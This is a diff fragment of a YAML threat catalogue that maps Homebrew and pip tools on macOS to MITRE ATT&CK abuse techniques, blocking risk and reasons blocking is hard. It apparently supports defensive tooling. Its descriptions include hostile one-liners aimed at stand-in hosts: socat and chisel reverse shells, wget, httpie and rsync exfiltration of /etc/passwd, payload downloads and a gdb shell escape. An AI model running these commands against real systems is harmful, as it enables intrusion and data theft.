+        mitre: "T1059.007"
+        description: "mongosh executes arbitrary JavaScript with access to Node.js APIs including child_process for command execution"
+      - technique: "Database reconnaissance"
+        mitre: "T1005"
+        description: "show dbs, show collections, db.collection.find() enumerates and dumps database contents"
+      - technique: "Connection string credential exposure"
+        mitre: "T1552.001"
+        description: "MongoDB connection strings in shell history or .mongoshrc.js contain credentials"
+    blocking_risk: low
+    why_hard_to_block: "Required for MongoDB development and administration"
+    references:
+      - "https://attack.mitre.org/techniques/T1059/007/"
+
+  # =========================================================================
+  # NETWORK TOOLS
+  # =========================================================================
+
+  - name: nmap
+    install: homebrew
+    prevalence: common
+    description: "Network mapper — port scanning, service detection, and network discovery"
+    abuse_techniques:
+      - technique: "Network reconnaissance"
+        mitre: "T1046"
+        description: "nmap -sV scans for open ports and identifies services. -O detects operating systems. -sn discovers live hosts"
+      - technique: "NSE script execution"
+        mitre: "T1059"
+        description: "nmap --script=<script> executes Nmap Scripting Engine (Lua) scripts that can perform vulnerability scanning, brute forcing, and exploitation"
+      - technique: "Vulnerability scanning"
+        mitre: "T1595.002"
+        description: "nmap --script=vuln runs vulnerability detection scripts against discovered services"
+    blocking_risk: moderate
+    why_hard_to_block: "Used by network engineers, security teams, and SREs for legitimate network diagnostics and security assessments"
+    references:
+      - "https://attack.mitre.org/techniques/T1046/"
+
+  - name: socat
+    install: homebrew
+    prevalence: moderate
+    description: "SOcket CAT — multipurpose relay for bidirectional data transfer between two channels"
+    abuse_techniques:
+      - technique: "Reverse shell"
+        mitre: "T1059.004"
+        description: "socat TCP:attacker:4444 EXEC:/bin/sh creates a reverse shell. Supports encrypted (SSL) channels"
+      - technique: "Port forwarding / tunneling"
+        mitre: "T1090"
+        description: "socat TCP-LISTEN:8080,fork TCP:internal:80 creates port forwards, useful for pivoting through compromised hosts"
+      - technique: "File transfer"
+        mitre: "T1105"
+        description: "socat can transfer files between systems using TCP, UDP, or Unix sockets"
+      - technique: "Bind shell"
+        mitre: "T1059.004"
+        description: "socat TCP-LISTEN:4444 EXEC:/bin/sh creates a bind shell accessible over the network"
+      - technique: "TTY shell upgrade"
+        mitre: "T1059.004"
+        description: "socat file:`tty`,raw,echo=0 TCP:attacker:4444 provides a fully interactive TTY reverse shell"
+    blocking_risk: moderate
+    why_hard_to_block: "Used for network debugging, port forwarding in development, and testing. More capable than netcat."
+    references:
+      - "https://gtfobins.github.io/gtfobins/socat/"
+
+  - name: ngrok
+    install: homebrew  # also direct download
+    prevalence: common
+    description: "Secure tunnel to localhost — exposes local services to the public internet"
+    abuse_techniques:
+      - technique: "C2 tunnel establishment"
+        mitre: "T1572"
+        description: "ngrok http 8080 creates an HTTPS tunnel from the public internet to a local C2 listener, bypassing NAT and firewalls"
+      - technique: "Data exfiltration over HTTPS"
+        mitre: "T1048.002"
+        description: "ngrok tunnels appear as legitimate HTTPS traffic to ngrok.io, making exfiltration difficult to detect at the network level"
+      - technique: "Reverse proxy for phishing"
+        mitre: "T1090.002"
+        description: "ngrok can proxy traffic to a local phishing page, providing a legitimate-looking HTTPS URL"
+      - technique: "Firewall bypass"
+        mitre: "T1572"
+        description: "ngrok establishes outbound HTTPS connections that bypass most egress filtering, creating inbound-accessible tunnels"
+    blocking_risk: moderate
+    why_hard_to_block: "Developers use ngrok for webhook testing, mobile app development, and demoing local work. Blocking the ngrok domain breaks these workflows."
+    references:
+      - "https://attack.mitre.org/techniques/T1572/"
+
+  - name: cloudflared
+    install: homebrew
+    prevalence: common
+    description: "Cloudflare Tunnel client — creates encrypted tunnels between local services and Cloudflare's network"
+    abuse_techniques:
+      - technique: "Persistent C2 tunnel"
+        mitre: "T1572"
+        description: "cloudflared tunnel creates persistent tunnels through Cloudflare's CDN, extremely difficult to distinguish from legitimate Cloudflare traffic"
+      - technique: "Quick tunnel for immediate access"
+        mitre: "T1572"
+        description: "cloudflared tunnel --url http://localhost:8080 creates a temporary tunnel with a trycloudflare.com URL — no account needed"
+      - technique: "SSH tunneling"
+        mitre: "T1021.004"
+        description: "cloudflared access ssh provides SSH access through Cloudflare tunnels, bypassing network restrictions"
+    blocking_risk: moderate
+    why_hard_to_block: "Used for legitimate Cloudflare Zero Trust deployments. Blocking Cloudflare CDN traffic is impractical for most organizations."
+    references:
+      - "https://attack.mitre.org/techniques/T1572/"
+      - "https://blog.sekoia.io/cloudflare-tunnels-abuse/"
+
+  - name: mitmproxy
+    install: homebrew  # also pip
+    prevalence: moderate
+    description: "Interactive HTTPS proxy for debugging, testing, and penetration testing"
+    abuse_techniques:
+      - technique: "TLS interception"
+        mitre: "T1557.002"
+        description: "mitmproxy performs SSL/TLS man-in-the-middle, capturing plaintext credentials, API keys, and session tokens from HTTPS traffic"
+      - technique: "Traffic modification"
+        mitre: "T1557"
+        description: "mitmproxy scripts can modify HTTP requests and responses in real-time, injecting payloads or altering application behavior"
+      - technique: "Credential harvesting"
+        mitre: "T1040"
+        description: "Captures authentication headers, cookies, OAuth tokens, and form submissions from proxied traffic"
+    blocking_risk: moderate
+    why_hard_to_block: "Used by developers for API debugging and security teams for testing. Mobile developers use it extensively for app traffic analysis."
+    references:
+      - "https://attack.mitre.org/techniques/T1557/"
+
+  - name: tshark
+    install: homebrew  # wireshark formula
+    prevalence: moderate
+    description: "Terminal-based Wireshark — command-line network protocol analyzer"
+    abuse_techniques:
+      - technique: "Network sniffing"
+        mitre: "T1040"
+        description: "tshark -i en0 captures network traffic on macOS interfaces, extracting credentials from unencrypted protocols"
+      - technique: "Credential extraction"
+        mitre: "T1040"
+        description: "tshark -Y 'http.authbasic' filters for HTTP Basic Auth credentials. Can extract NTLM, Kerberos, and other authentication traffic"
+      - technique: "PCAP exfiltration"
+        mitre: "T1074"
+        description: "tshark -w capture.pcap records traffic for offline analysis and exfiltration"
+    blocking_risk: moderate
+    why_hard_to_block: "Essential for network debugging and security analysis. Requires root/BPF access on macOS."
+    macos_specific_notes: "On macOS, packet capture requires membership in the access_bpf group (installed by Wireshark) or root. Homebrew tshark is distinct from any Apple-supplied tools."
+    references:
+      - "https://attack.mitre.org/techniques/T1040/"
+
+  # =========================================================================
+  # TUNNELING / PROXY (dedicated tools)
+  # =========================================================================
+
+  - name: chisel
+    install: homebrew  # also go install
+    prevalence: moderate
+    description: "Fast TCP/UDP tunnel over HTTP — client/server architecture for port forwarding"
+    abuse_techniques:
+      - technique: "Reverse tunnel for C2"
+        mitre: "T1572"
+        description: "chisel client attacker:8080 R:4444:127.0.0.1:22 creates reverse tunnels through HTTP, bypassing firewalls"
+      - technique: "SOCKS proxy for pivoting"
+        mitre: "T1090.001"
+        description: "chisel client attacker:8080 R:socks creates a reverse SOCKS proxy through the compromised host"
+      - technique: "Firewall evasion"
+        mitre: "T1572"
+        description: "Tunnels over HTTP/HTTPS (ports 80/443), appearing as normal web traffic to network monitoring"
+    blocking_risk: low
+    why_hard_to_block: "Less common in legitimate use, but when present it indicates DevOps/security work. A well-known pentesting tool."
+    references:
+      - "https://attack.mitre.org/techniques/T1572/"
+      - "https://github.com/jpillora/chisel"
+
+  - name: sshuttle
+    install: homebrew  # also pip
+    prevalence: moderate
+    description: "Transparent proxy server that works as a poor man's VPN over SSH"
+    abuse_techniques:
+      - technique: "VPN-like tunnel over SSH"
+        mitre: "T1572"
+        description: "sshuttle -r user@host 10.0.0.0/8 transparently routes all traffic to target subnets through an SSH connection"
+      - technique: "Network pivoting"
+        mitre: "T1090"
+        description: "Provides full network-layer access to remote subnets through a single SSH connection, enabling scanning and lateral movement"
+    blocking_risk: moderate
+    why_hard_to_block: "Used by developers to access internal networks. Operates over standard SSH (port 22), making it indistinguishable from normal SSH traffic."
+    references:
+      - "https://attack.mitre.org/techniques/T1572/"
+
+  # =========================================================================
+  # REVERSE ENGINEERING / SECURITY RESEARCH
+  # =========================================================================
+
+  - name: frida
+    install: pip  # frida-tools
+    prevalence: moderate
+    description: "Dynamic instrumentation toolkit — injects JavaScript into running processes"
+    abuse_techniques:
+      - technique: "Process injection"
+        mitre: "T1055"
+        description: "frida -p <pid> -l script.js injects JavaScript into any accessible process, hooking and modifying function behavior at runtime"
+      - technique: "Credential interception"
+        mitre: "T1056"
+        description: "Frida can hook authentication functions (Security.framework, CommonCrypto) to intercept credentials before encryption"
+      - technique: "TCC/Gatekeeper bypass research"
+        mitre: "T1553"
+        description: "Frida can instrument TCC and Gatekeeper checks to understand and potentially bypass macOS security mechanisms"
+      - technique: "Keychain API hooking"
+        mitre: "T1555.001"
+        description: "macOS-specific: Hook SecItemCopyMatching and related Security.framework APIs to intercept Keychain queries and results"
+      - technique: "SSL pinning bypass"
+        mitre: "T1557"
+        description: "frida-tools can disable SSL certificate pinning in applications, enabling traffic interception"
+    blocking_risk: moderate
+    why_hard_to_block: "Used by security researchers, mobile developers (iOS app testing), and reverse engineers. Critical for security assessments."
+    macos_specific_notes: "On macOS, Frida can attach to processes and interact with Objective-C runtime, Swift, and Core Foundation APIs. SIP must be partially disabled for system process injection."
+    references:
+      - "https://frida.re/"
+      - "https://attack.mitre.org/techniques/T1055/"
+
+  - name: radare2
+    install: homebrew  # radare2 formula
+    prevalence: moderate
+    description: "Reverse engineering framework — disassembler, debugger, and binary analysis"
+    abuse_techniques:
+      - technique: "Shell escape"
+        mitre: "T1059.004"
+        description: "!command in radare2 executes shell commands. The r2pipe API allows scripting arbitrary system interactions"
+      - technique: "Binary analysis for vulnerability discovery"
+        mitre: "T1588.006"
+        description: "r2 analyzes Mach-O binaries for vulnerabilities, extracts strings, identifies functions, and maps code flow"
+      - technique: "Malware development aid"
+        mitre: "T1587.001"
+        description: "r2's assembler (rasm2) and binary patching capabilities assist in shellcode development and binary modification"
+    blocking_risk: low
+    why_hard_to_block: "Used by security researchers and reverse engineers. Presence may indicate security team or research work."
+    macos_specific_notes: "radare2 understands Mach-O format natively, including Universal binaries, code signatures, and Objective-C metadata."
+    references:
+      - "https://gtfobins.github.io/gtfobins/r2/"
+
+  - name: gdb
+    install: homebrew
+    prevalence: moderate
+    description: "GNU Debugger — process debugging and memory inspection"
+    abuse_techniques:
+      - technique: "Process memory reading"
+        mitre: "T1005"
+        description: "GDB attaches to running processes and reads memory, including credentials, encryption keys, and tokens in process memory"
+      - technique: "Shell escape"
+        mitre: "T1059.004"
+        description: "shell command or !command in GDB executes OS commands. python exec(\"import os;os.system('/bin/sh')\") works too"
+      - technique: "Process injection via ptrace"
+        mitre: "T1055"
+        description: "GDB can inject code into running processes via set and call commands"
+    blocking_risk: low
+    why_hard_to_block: "Required for C/C++ debugging workflows. On macOS, requires code-signing with debugging entitlement or SIP adjustments."
+    macos_specific_notes: "macOS restricts ptrace via SIP. GDB requires a code-signing certificate with the com.apple.security.cs.debugger entitlement. Homebrew GDB needs manual codesigning to function."
+    references:
+      - "https://gtfobins.github.io/gtfobins/gdb/"
+
+  # =========================================================================
+  # SECURITY/OFFENSIVE TOOLS
+  # =========================================================================
+
+  - name: sqlmap
+    install: homebrew  # also pip
+    prevalence: moderate
+    description: "Automatic SQL injection and database takeover tool"
+    abuse_techniques:
+      - technique: "SQL injection exploitation"
+        mitre: "T1190"
+        description: "sqlmap automates detection and exploitation of SQL injection vulnerabilities, including OS command execution via --os-shell"
+      - technique: "Database extraction"
+        mitre: "T1005"
+        description: "sqlmap --dump extracts entire database contents including credentials and PII"
+      - technique: "OS command execution via database"
+        mitre: "T1059"
+        description: "sqlmap --os-shell achieves operating system command execution through SQL injection (xp_cmdshell, UDF, etc.)"
+    blocking_risk: low
+    why_hard_to_block: "Used by security teams for authorized penetration testing. Presence on non-security workstations is a strong indicator of compromise or policy violation."
+    references:
+      - "https://attack.mitre.org/techniques/T1190/"
+
+  - name: masscan
+    install: homebrew
+    prevalence: moderate
+    description: "Mass IP port scanner — scans the entire internet in under 5 minutes"
+    abuse_techniques:
+      - technique: "Large-scale network reconnaissance"
+        mitre: "T1046"
+        description: "masscan 0.0.0.0/0 -p0-65535 performs internet-wide port scanning at extreme speeds (10 million packets/sec)"
+      - technique: "Internal network discovery"
+        mitre: "T1046"
+        description: "masscan 10.0.0.0/8 rapidly discovers all open ports across internal networks"
+    blocking_risk: low
+    why_hard_to_block: "Used by security teams and researchers. High-rate scanning is easy to detect but the tool itself has legitimate uses."
+    references:
+      - "https://attack.mitre.org/techniques/T1046/"
+
+  # =========================================================================
+  # SCRIPTING / AUTOMATION / HTTP
+  # =========================================================================
+
+  - name: jq
+    install: homebrew
+    prevalence: very_common
+    description: "Command-line JSON processor — filters, transforms, and extracts data from JSON"
+    abuse_techniques:
+      - technique: "Credential extraction from JSON configs"
+        mitre: "T1552.001"
+        description: "jq '.credentials' parses cloud credential files, Terraform state, Kubernetes secrets, and other JSON-formatted configuration containing secrets"
+      - technique: "Data processing for exfiltration"
+        mitre: "T1005"
+        description: "jq enables precise extraction of specific fields from large JSON datasets before exfiltration, reducing data volume and detection risk"
+      - technique: "Shell execution via builtins (limited)"
+        mitre: "T1059"
+        description: "jq's @sh format string and env builtin provide limited interaction with the shell environment"
+    blocking_risk: low
+    why_hard_to_block: "Ubiquitous in shell scripts, CI/CD pipelines, and any workflow involving JSON APIs. Blocking jq breaks countless automation scripts."
+    references:
+      - "https://attack.mitre.org/techniques/T1552/001/"
+
+  - name: httpie
+    install: homebrew  # also pip
+    prevalence: common
+    description: "User-friendly HTTP client for the command line (http/https commands)"
+    abuse_techniques:
+      - technique: "Data exfiltration over HTTP"
+        mitre: "T1048.002"
+        description: "http POST attacker.com/exfil data=@/etc/passwd sends files and data to attacker-controlled servers"
+      - technique: "API credential abuse"
+        mitre: "T1528"
+        description: "http --auth user:pass and stored sessions in ~/.config/httpie/ may contain API credentials"
+      - technique: "File download"
+        mitre: "T1105"
+        description: "http --download downloads files from the internet, useful for ingress tool transfer"
+    blocking_risk: low
+    why_hard_to_block: "Used as a developer-friendly alternative to curl for API testing"
+    references:
+      - "https://attack.mitre.org/techniques/T1048/002/"
+
+  # =========================================================================
+  # GIT ECOSYSTEM
+  # =========================================================================
+
+  - name: git
+    install: homebrew  # Homebrew git, distinct from Apple's /usr/bin/git
+    prevalence: very_common
+    description: "Homebrew-installed Git — version control system (distinct from Apple's Xcode git)"
+    abuse_techniques:
+      - technique: "Credential helper extraction"
+        mitre: "T1555"
+        description: "git credential-osxkeychain get extracts stored Git credentials from macOS Keychain"
+      - technique: "Git hooks for persistence"
+        mitre: "T1546"
+        description: "Malicious .git/hooks/ scripts (pre-commit, post-checkout) execute on git operations. Global hooks via core.hooksPath affect all repos"
+      - technique: "Git config includes for injection"
+        mitre: "T1574"
+        description: "git config --global include.path loads additional config files that can set malicious credential helpers or hooks"
+      - technique: "Source code access and history mining"
+        mitre: "T1213.003"
+        description: "git log -p and git show search commit history for accidentally committed secrets, credentials, and keys"
+      - technique: "Remote repository exfiltration"
+        mitre: "T1537"
+        description: "git push to attacker-controlled remotes exfiltrates entire repositories including history"
+      - technique: "Submodule-based code execution"
+        mitre: "T1195.002"
+        description: "Malicious .gitmodules can cause git submodule update to clone and execute code from attacker-controlled repositories"
+    blocking_risk: high
+    why_hard_to_block: "Git is the universal version control system. Blocking it halts all software development."
+    macos_specific_notes: "Homebrew Git uses macOS Keychain via git-credential-osxkeychain by default. The Keychain integration means Git credentials persist securely but are accessible to any process with Keychain access."
+    references:
+      - "https://attack.mitre.org/techniques/T1546/"
+      - "https://www.elttam.com/blog/cve-2024-32002/"
+
+  # =========================================================================
+  # BUILD TOOLS
+  # =========================================================================
+
+  - name: cmake
+    install: homebrew
+    prevalence: common
+    description: "Cross-platform build system generator"
+    abuse_techniques:
+      - technique: "Arbitrary command execution via CMakeLists.txt"
+        mitre: "T1059"
+        description: "execute_process(COMMAND /bin/sh) in CMakeLists.txt runs during cmake configure phase. ExternalProject_Add fetches and executes external code"
+      - technique: "Build-time code execution"
+        mitre: "T1059"
+        description: "add_custom_command runs arbitrary commands during build. cmake -P script.cmake executes CMake scripts directly"
+      - technique: "Supply chain via FetchContent"
+        mitre: "T1195.002"
+        description: "FetchContent_Declare downloads and builds external projects during configure, executing their CMakeLists.txt"
+    blocking_risk: moderate
+    why_hard_to_block: "Standard build system for C/C++ projects. Many Homebrew formulae use CMake internally."
+    references:
+      - "https://attack.mitre.org/techniques/T1059/"
+
+  - name: gradle
+    install: homebrew  # also sdkman
+    prevalence: common
+    description: "Build automation tool — primarily for JVM languages (Java, Kotlin, Groovy)"
+    abuse_techniques:
+      - technique: "Groovy script execution"
+        mitre: "T1059"
+        description: "build.gradle files are Groovy scripts with full JVM access. task malicious { doLast { 'cmd'.execute() } } runs arbitrary commands"
+      - technique: "Init script injection"
+        mitre: "T1546"
+        description: "~/.gradle/init.d/*.gradle scripts execute on every Gradle invocation, providing persistence"
+      - technique: "Plugin supply chain"
+        mitre: "T1195.002"
+        description: "Gradle plugins from plugins.gradle.org or Maven Central execute arbitrary code during build"
+      - technique: "Gradle wrapper manipulation"
+        mitre: "T1195.002"
+        description: "gradlew (wrapper) downloads and executes a specific Gradle distribution. Modifying gradle-wrapper.properties to point to a malicious distribution achieves code execution"
+    blocking_risk: moderate
+    why_hard_to_block: "Standard build tool for Android development and Java/Kotlin projects"
+    references:
+      - "https://attack.mitre.org/techniques/T1059/"
+
+  - name: maven
+    install: homebrew
+    prevalence: common
+    description: "Apache Maven — Java build automation and dependency management"
+    abuse_techniques:
+      - technique: "Plugin execution"
+        mitre: "T1059"
+        description: "Maven plugins execute arbitrary Java code during build phases. exec-maven-plugin explicitly runs OS commands"
+      - technique: "Dependency confusion"
+        mitre: "T1195.002"
+        description: "Maven resolves dependencies from configured repositories. Internal package names published to Maven Central take precedence in misconfigured settings"
+      - technique: "Settings.xml credential access"
+        mitre: "T1552.001"
+        description: "~/.m2/settings.xml contains repository credentials, often with passwords in plaintext or weak Maven encryption"
+    blocking_risk: moderate
+    why_hard_to_block: "Standard Java build tool. Blocking it prevents Java/Kotlin application compilation and dependency resolution."
+    references:
+      - "https://attack.mitre.org/techniques/T1195/002/"
+
+  - name: bazel
+    install: homebrew
+    prevalence: moderate
+    description: "Google's build system — supports multi-language, large-scale builds"
+    abuse_techniques:
+      - technique: "Starlark/Python-like execution"
+        mitre: "T1059"
+        description: "BUILD files use Starlark (Python subset). genrule() executes arbitrary shell commands during build"
+      - technique: "External repository fetching"
+        mitre: "T1195.002"
+        description: "WORKSPACE file http_archive rules download and execute code from external URLs during build setup"
+      - technique: "Repository rule code execution"
+        mitre: "T1059"
+        description: "Custom repository rules execute arbitrary commands via repository_ctx.execute() during workspace setup"
+    blocking_risk: moderate
+    why_hard_to_block: "Used by large-scale projects (Google-derived, TensorFlow, Angular). Critical for monorepo builds."
+    references:
+      - "https://attack.mitre.org/techniques/T1059/"
+
+  # =========================================================================
+  # ADDITIONAL HIGH-VALUE TOOLS
+  # =========================================================================
+
+  - name: openssl
+    install: homebrew  # distinct from LibreSSL /usr/bin/openssl
+    prevalence: very_common
+    description: "OpenSSL toolkit — TLS/SSL implementation, certificate management, and cryptographic operations"
+    abuse_techniques:
+      - technique: "Encrypted reverse shell"
+        mitre: "T1573.002"
+        description: "openssl s_client + mkfifo creates an encrypted reverse shell that evades network content inspection"
+      - technique: "Certificate forgery"
+        mitre: "T1587.003"
+        description: "openssl req -x509 generates self-signed certificates for TLS interception, phishing sites, or code signing"
+      - technique: "Password/hash cracking"
+        mitre: "T1110"
+        description: "openssl passwd generates password hashes. openssl enc provides symmetric encryption/decryption for data staging"
+      - technique: "File encryption for defense evasion"
+        mitre: "T1027"
+        description: "openssl enc -aes-256-cbc encrypts payloads and exfiltrated data, evading DLP and content inspection"
+      - technique: "Private key extraction"
+        mitre: "T1552.004"
+        description: "openssl rsa/ec/pkey manipulates private keys. If an attacker gains access to key files, openssl converts between formats for use"
+    blocking_risk: high
+    why_hard_to_block: "Required for TLS certificate management, key generation, and cryptographic operations in development and operations."
+    macos_specific_notes: "Homebrew OpenSSL is distinct from Apple's LibreSSL at /usr/bin/openssl. Homebrew version supports more algorithms and options. Many Homebrew packages link against it."
+    references:
+      - "https://gtfobins.github.io/gtfobins/openssl/"
+
+  - name: ffmpeg
+    install: homebrew
+    prevalence: common
+    description: "Multimedia framework — converts, records, and streams audio/video"
+    abuse_techniques:
+      - technique: "Screen recording"
+        mitre: "T1113"
+        description: "ffmpeg -f avfoundation -i '1:' captures macOS screen content via AVFoundation framework"
+      - technique: "Audio capture"
+        mitre: "T1123"
+        description: "ffmpeg -f avfoundation -i ':0' records audio from macOS microphone"
+      - technique: "Webcam capture"
+        mitre: "T1125"
+        description: "ffmpeg -f avfoundation -i '0' captures video from macOS webcam via AVFoundation"
+      - technique: "Network streaming for exfiltration"
+        mitre: "T1048"
+        description: "ffmpeg streams captured audio/video over RTMP, HLS, or UDP to attacker-controlled servers"
+    blocking_risk: moderate
+    why_hard_to_block: "Used by developers for media processing, video encoding, and content creation workflows."
+    macos_specific_notes: "macOS-specific: Uses AVFoundation for device capture. Subject to TCC permissions (camera, microphone, screen recording) but Terminal.app may already have these grants."
+    references:
+      - "https://attack.mitre.org/techniques/T1113/"
+
+  - name: imagemagick
+    install: homebrew  # imagemagick formula
+    prevalence: common
+    description: "Image processing suite — convert, edit, and compose images"
+    abuse_techniques:
+      - technique: "Arbitrary file read via delegates"
+        mitre: "T1005"
+        description: "ImageMagick's delegate system can read arbitrary files. Historically exploitable via ImageTragick (CVE-2016-3714)"
+      - technique: "Shell command injection"
+        mitre: "T1059"
+        description: "Crafted image files can trigger command execution through delegates.xml processing (ephemeral:, mvg:, msl: protocols)"
+      - technique: "SSRF via URL handling"
+        mitre: "T1090"
+        description: "ImageMagick can fetch images from URLs, enabling SSRF when processing user-supplied image paths"
+    blocking_risk: moderate
+    why_hard_to_block: "Widely used in image processing pipelines, web applications (thumbnail generation), and content management."
+    references:
+      - "https://imagetragick.com/"
+
+  - name: wget
+    install: homebrew
+    prevalence: common
+    description: "Network downloader — retrieves files from HTTP, HTTPS, and FTP servers"
+    abuse_techniques:
+      - technique: "Payload download"
+        mitre: "T1105"
+        description: "wget http://attacker.com/payload downloads files from the internet. Supports recursive download of entire sites"
+      - technique: "Data exfiltration via POST"
+        mitre: "T1048.002"
+        description: "wget --post-file=/etc/passwd http://attacker.com/ exfiltrates files over HTTP POST"
+      - technique: "File write to arbitrary paths"
+        mitre: "T1105"
+        description: "wget -O /path/to/file writes downloaded content to any writable path, useful for payload staging and overwriting configs"
+    blocking_risk: low
+    why_hard_to_block: "Common alternative to curl for file downloads in scripts and automation"
+    references:
+      - "https://gtfobins.github.io/gtfobins/wget/"
+
+  - name: rsync
+    install: homebrew  # newer than macOS system rsync
+    prevalence: common
+    description: "Fast, versatile file copying and synchronization tool"
+    abuse_techniques:
+      - technique: "Data exfiltration"
+        mitre: "T1048"
+        description: "rsync -avz /sensitive/ attacker:/exfil/ efficiently exfiltrates large volumes of data with delta transfer (only changed bytes)"
+      - technique: "Remote file access"
+        mitre: "T1005"
+        description: "rsync user@host:/etc/shadow . retrieves files from remote systems. Works over SSH by default"
+      - technique: "Rsync daemon for persistence"
+        mitre: "T1105"
+        description: "rsync --daemon creates a persistent file server, accessible without SSH authentication if configured"
+    blocking_risk: moderate
+    why_hard_to_block: "Standard backup and file synchronization tool. Used in deployment scripts and data transfer workflows."
+    references:
+      - "https://gtfobins.github.io/gtfobins/rsync/"
+
+  - name: tmux
+    install: homebrew
+    prevalence: very_common
+    description: "Terminal multiplexer — persistent terminal sessions"
+    abuse_techniques:
+      - technique: "Session persistence"
+        mitre: "T1505"
+        description: "tmux sessions survive terminal closure and user logout, providing persistent shell access on compromised systems"
+      - technique: "Session hijacking"
+        mitre: "T1563"
+        description: "tmux attach -t <session> attaches to other users' sessions if the socket permissions allow it"
+      - technique: "Command logging evasion"
+        mitre: "T1562.003"
+        description: "Commands run inside tmux may not be captured by shell history logging or endpoint agents that monitor Terminal.app"
+    blocking_risk: moderate
+    why_hard_to_block: "Extremely popular developer tool for managing long-running processes and maintaining persistent terminal sessions."
+    references:
+      - "https://attack.mitre.org/techniques/T1563/"
+
+  - name: screen
+    install: homebrew
+    prevalence: common
+    description: "GNU Screen — terminal multiplexer for persistent sessions"
+    abuse_techniques:
+      - technique: "Session persistence"
+        mitre: "T1505"
+        description: "screen -d -m creates detached sessions that persist after disconnect"
+      - technique: "Log file write"
+        mitre: "T1074"
+        description: "screen -L logs all terminal output to a file, useful for capturing credentials from interactive sessions"
+      - technique: "Shell escape"
+        mitre: "T1059.004"
+        description: "If screen has SUID/elevated perms, it can be used to escalate privileges"
+    blocking_risk: low
+    why_hard_to_block: "Alternative to tmux for persistent terminal sessions. Less popular but still widely used."
+    references:
+      - "https://gtfobins.github.io/gtfobins/screen/"
+
+  - name: expect
+    install: homebrew  # or tcl formula
+    prevalence: moderate
+    description: "Programmatic interaction with interactive programs — automates terminal I/O"
+    abuse_techniques:
+      - technique: "Credential automation"
+        mitre: "T1059"
+        description: "expect scripts automate password entry for su, sudo, ssh, and other interactive authentication prompts"
+      - technique: "Interactive tool automation"
+        mitre: "T1059"
+        description: "expect automates any interactive CLI tool, useful for scripting attacks that require user interaction"
+    blocking_risk: low
+    why_hard_to_block: "Used in legacy automation scripts and testing. Less common on modern macOS systems."
+    references:
+      - "https://attack.mitre.org/techniques/T1059/"
+
+  - name: proxychains-ng
+    install: homebrew  # proxychains-ng formula
+    prevalence: moderate
+    description: "Forces TCP connections through SOCKS/HTTP proxies — transparent proxy wrapper"
+    abuse_techniques:
+      - technique: "Traffic anonymization"
+        mitre: "T1090.003"
+        description: "proxychains4 nmap target routes all tool traffic through proxy chains (Tor, SOCKS), hiding the attacker's source IP"
+      - technique: "Firewall bypass"
+        mitre: "T1090"
+        description: "Routes traffic through allowed proxy servers to bypass egress filtering and network segmentation"
+    blocking_risk: low
+    why_hard_to_block: "Used by security professionals for authorized penetration testing. Presence may indicate security research or malicious activity."
+    references:
+      - "https://attack.mitre.org/techniques/T1090/003/"
+
+  - name: john
+    install: homebrew  # john-jumbo formula
+    prevalence: moderate
+    description: "John the Ripper — password hash cracking tool"
+    abuse_techniques:
+      - technique: "Password cracking"
+        mitre: "T1110.002"
+        description: "john --wordlist=rockyou.txt hashes.txt cracks password hashes using dictionary and brute-force attacks"
+      - technique: "Hash extraction utilities"
+        mitre: "T1003"
+        description: "Bundled utilities (zip2john, ssh2john, keepass2john, etc.) extract hashes from encrypted files for offline cracking"
+      - technique: "macOS Keychain cracking"
+        mitre: "T1555.001"
+        description: "macOS-specific: keychain2john extracts hashes from macOS Keychain files for offline password cracking"
+    blocking_risk: low
+    why_hard_to_block: "Legitimate security audit tool. Presence on non-security workstations warrants investigation."
+    macos_specific_notes: "keychain2john is macOS-specific and targets the Keychain database format."
+    references:
+      - "https://attack.mitre.org/techniques/T1110/002/"
+
+  - name: hashcat
+    install: homebrew
+    prevalence: moderate
+    description: "GPU-accelerated password recovery tool"
+    abuse_techniques:
+      - technique: "High-speed password cracking"
+        mitre: "T1110.002"
+        description: "hashcat -m 0 -a 0 hashes.txt wordlist.txt performs GPU-accelerated hash cracking at billions of attempts per second"
+      - technique: "Rule-based attack"
+        mitre: "T1110.002"
+        description: "hashcat's rule engine generates password mutations, dramatically increasing crack rates against real-world passwords"
+    blocking_risk: low
+    why_hard_to_block: "Legitimate password auditing tool for security teams"
+    macos_specific_notes: "On Apple Silicon Macs, hashcat can leverage the Metal GPU API for acceleration"
+    references:
+      - "https://attack.mitre.org/techniques/T1110/002/"
+
+  - name: wireguard-tools
+    install: homebrew  # wireguard-tools formula
+    prevalence: common
+    description: "WireGuard VPN configuration tools — fast, modern VPN"
+    abuse_techniques:
+      - technique: "Covert VPN tunnel"
+        mitre: "T1572"
+        description: "wg-quick up creates VPN tunnels that appear as standard UDP traffic. WireGuard's minimal protocol signature makes detection difficult"
+      - technique: "Network pivoting"
+        mitre: "T1090"
+        description: "A WireGuard tunnel provides full network-layer access to remote networks, enabling lateral movement"
+      - technique: "Configuration credential extraction"
+        mitre: "T1552.001"
+        description: "WireGuard config files contain private keys and peer configurations in plaintext"
+    blocking_risk: moderate
+    why_hard_to_block: "Increasingly popular VPN solution for remote access. Blocking it may break legitimate VPN connectivity."
+    references:
+      - "https://attack.mitre.org/techniques/T1572/"
+
+  - name: dnsmasq
+    install: homebrew
+    prevalence: moderate
+    description: "Lightweight DNS forwarder and DHCP server"
+    abuse_techniques:
+      - technique: "DNS spoofing"
+        mitre: "T1557.001"
+        description: "dnsmasq --address=/target.com/attacker-ip redirects DNS queries, enabling man-in-the-middle attacks on the local network"
+      - technique: "Rogue DHCP server"
+        mitre: "T1557"
+        description: "dnsmasq's DHCP server can serve malicious DNS servers and gateway addresses to network clients"
+    blocking_risk: low
+    why_hard_to_block: "Used in local development environments, Docker networking, and Kubernetes DNS."
+    references:
+      - "https://attack.mitre.org/techniques/T1557/001/"
+
+  - name: gpg
+    install: homebrew  # gnupg formula
+    prevalence: common
+    description: "GNU Privacy Guard — encryption, signing, and key management"
+    abuse_techniques:
+      - technique: "Data encryption for exfiltration"
+        mitre: "T1027"
+        description: "gpg -c --cipher-algo AES256 encrypts files before exfiltration, evading DLP content inspection"
+      - technique: "Encrypted communication channel"
+        mitre: "T1573.001"
+        description: "GPG-encrypted messages provide a covert communication channel that blends with legitimate encrypted email usage"
+      - technique: "Keyring credential extraction"
+        mitre: "T1552.004"
+        description: "gpg --export-secret-keys extracts private keys from the GPG keyring. Access to private keys enables decryption of intercepted communications"
+    blocking_risk: moderate
+    why_hard_to_block: "Used for Git commit signing, email encryption, and package verification. Blocking it breaks signed commit workflows."
+    references:
+      - "https://attack.mitre.org/techniques/T1027/"
+
+  - name: age
+    install: homebrew
+    prevalence: moderate
+    description: "Modern file encryption tool — simpler alternative to GPG"
